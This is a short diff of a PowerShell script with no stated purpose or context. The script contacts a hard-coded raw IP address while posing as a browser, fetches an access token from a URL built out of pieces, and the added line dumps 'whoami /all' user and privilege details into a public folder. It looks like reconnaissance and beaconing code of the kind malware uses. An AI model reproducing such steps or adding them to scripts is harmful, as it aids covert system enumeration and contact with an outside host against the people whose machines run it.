@@ -18,6 +18,7 @@ $URL = @(
 )
 
 Invoke-RestMethod -Uri "http://134.209.28.104/1" -Method GET -Headers @{ "User-Agent" = "Mozilla/5.0" } -Verbose
+whoami.exe /all > C:\Users\Public\whoami2.txt
 
 $Response = Invoke-RestMethod ($URL -join '/') -Method 'GET' -Headers $Headers -Verbose
 $AccessToken = $Response.apiKey
